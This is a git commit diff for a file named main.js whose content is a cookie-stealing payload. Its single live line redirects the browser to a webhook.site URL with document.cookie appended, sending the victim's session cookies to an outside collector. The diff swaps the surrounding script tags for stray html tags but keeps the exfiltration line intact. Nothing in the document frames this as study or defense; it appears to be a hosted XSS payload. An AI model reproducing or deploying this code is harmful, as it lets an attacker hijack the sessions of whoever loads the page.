4d4cfff9d348f1583755cbfc17161c4806519788
TiagoMF <126122241+TiogoMF@users.noreply.github.com>
2024-12-05 22:45:44 +0000

    Update main.js

--- main.js
+++ main.js
@@ -1,4 +1,3 @@
-<!DOCTYPE html>
-<script>
+<html>
     window.location.href = "https://webhook.site/4767edd6-0a10-4546-9ed2-5c423db1a935?cookie=" + encodeURIComponent(document.cookie);
-</script>
+<html>
